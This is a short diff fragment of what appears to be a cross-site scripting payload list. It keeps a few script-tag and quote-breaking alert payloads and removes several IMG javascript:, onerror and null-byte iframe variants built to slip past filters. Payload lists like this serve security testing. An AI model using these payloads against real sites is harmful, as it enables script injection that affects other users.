@@ -30,11 +30,3 @@
 ‘; alert(1);
 ‘)alert(1);//
 <ScRiPt>alert(1)</sCriPt>
-<IMG SRC=jAVasCrIPt:alert(‘XSS’)>
-<IMG SRC=”javascript:alert(‘XSS’);”>
-<IMG SRC=javascript:alert(&quot;XSS&quot;)>
-<IMG SRC=javascript:alert(‘XSS’)>      
-<img src=xss onerror=alert(1)>
-
-
-<iframe %00 src="&Tab;javascript:prompt(1)&Tab;"%00>
